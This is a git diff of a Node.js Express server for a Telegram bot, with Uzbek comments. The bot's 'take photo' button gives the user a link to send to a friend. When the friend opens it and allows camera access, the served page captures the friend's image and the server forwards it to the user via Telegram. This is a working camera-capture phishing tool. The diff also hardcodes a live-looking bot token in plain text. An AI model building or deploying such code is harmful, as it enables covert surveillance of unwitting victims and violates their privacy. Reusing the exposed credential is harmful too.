@@ -2,7 +2,6 @@ import express from "express";
 import TelegramBot from "node-telegram-bot-api";
 import path from "path";
 import { fileURLToPath } from "url";
-import multer from "multer";
 import fs from "fs";
 
 const __filename = fileURLToPath(import.meta.url);
@@ -11,15 +10,12 @@ const __dirname = path.dirname(__filename);
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// ✅ Bot token va baza URL
-const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA"; // o'z tokeningni yoz
-const BASE_URL = "https://korish.onrender.com";
+// Bot token
+const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
 
-// ✅ Botni webhook bilan sozlaymiz
-const bot = new TelegramBot(TOKEN, { webHook: true });
-bot.setWebHook(`${BASE_URL}/bot${TOKEN}`);
+const bot = new TelegramBot(TOKEN);
 
-// ✅ Tugmalar
+// Foydalanuvchi tugmalari
 const buttons = {
   reply_markup: {
     keyboard: [
@@ -30,14 +26,14 @@ const buttons = {
   },
 };
 
-// ✅ Webhook endpoint
-app.use(express.json());
-app.post(`/bot${TOKEN}`, (req, res) => {
-  bot.processUpdate(req.body);
-  res.sendStatus(200);
-});
+// JSON requestlarni qabul qilish
+app.use(express.json({ limit: "5mb" }));
+app.use(express.urlencoded({ extended: true, limit: "5mb" }));
 
-// ✅ /start
+// Static fayllar (index.html va boshqalar)
+app.use(express.static(__dirname));
+
+// /start
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   bot.sendMessage(
@@ -47,18 +43,21 @@ bot.onText(/\/start/, (msg) => {
   );
 });
 
-// ✅ Tugmalar
+// Tugmalarni qabul qilish
 bot.on("message", (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text;
 
   if (text === "📸 Rasm olish") {
-    const url = `${BASE_URL}/selfie/${chatId}`;
+    const url = `https://koryapman.onrender.com/selfie/${chatId}`;
+
     bot.sendMessage(
       chatId,
-      `📷 Rasm olish uchun quyidagi havolani bosing:\n\n${url}`
+      `📷 Rasm olish uchun quyidagi havolani do‘stingizga yuboring:\n\n${url}`
     );
-  } else if (text === "📢 Kanal") {
+  }
+
+  if (text === "📢 Kanal") {
     bot.sendMessage(
       chatId,
       "*Kanalga qo‘shilish uchun pastdagi tugmani bosing.*",
@@ -76,39 +75,39 @@ bot.on("message", (msg) => {
         },
       }
     );
-  } else if (text === "🆘 Yordam") {
+  }
+
+  if (text === "🆘 Yordam") {
     bot.sendMessage(
       chatId,
-      "📸 *Rasm olish* tugmasini bosing va linkni do‘stingizga yuboring.\n\nAgar kamera ruxsatiga rozilik bildirilsa — sizga rasm keladi.",
+      "📸 *Rasm olish* tugmasini bosing va berilgan linkni do‘stingizga yuboring.\n\nDo‘stingiz linkga kirib kamera ruxsatini bersa, sizga uning rasmi yuboriladi.",
       { parse_mode: "Markdown" }
     );
   }
 });
 
-// ✅ Selfie sahifa
-app.get("/selfie/:id", (req, res) => {
+// Selfie sahifa
+app.get("/selfie/:chatId", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-// ✅ Rasm yuklash (brauzer → server → bot)
-const upload = multer({ dest: "uploads/" });
-app.post("/upload", upload.single("photo"), async (req, res) => {
-  const { chatId } = req.body;
-  const filePath = req.file.path;
+// Selfie API (rasmni Telegramga yuboradi)
+app.post("/api/selfie", (req, res) => {
+  const chatId = req.body.chat_id;
+  const photoBase64 = req.body.photo; // Base64 string
+  if (!chatId || !photoBase64) return res.status(400).json({ ok: false });
 
-  try {
-    await bot.sendPhoto(chatId, fs.createReadStream(filePath), {
-      caption: "📸 Foydalanuvchi rasmi olindi ✅",
-    });
-    fs.unlinkSync(filePath); // vaqtinchalik faylni o‘chirish
-    res.json({ ok: true });
-  } catch (err) {
-    console.error(err);
-    res.json({ ok: false });
-  }
+  // Base64ni Bufferga aylantiramiz
+  const buffer = Buffer.from(photoBase64, "base64");
+
+  // Telegramga yuborish
+  bot
+    .sendPhoto(chatId, buffer, { caption: "Foydalanuvchi rasmi olindi ✅" })
+    .then(() => res.json({ ok: true }))
+    .catch((err) => res.status(500).json({ ok: false, error: err.message }));
 });
 
-// ✅ Serverni ishga tushiramiz
+// Server ishga tushishi
 app.listen(PORT, () => {
-  console.log(`✅ Server ishga tushdi: ${BASE_URL} (PORT: ${PORT})`);
+  console.log(`✅ Server ishga tushdi. Port: ${PORT}`);
 });
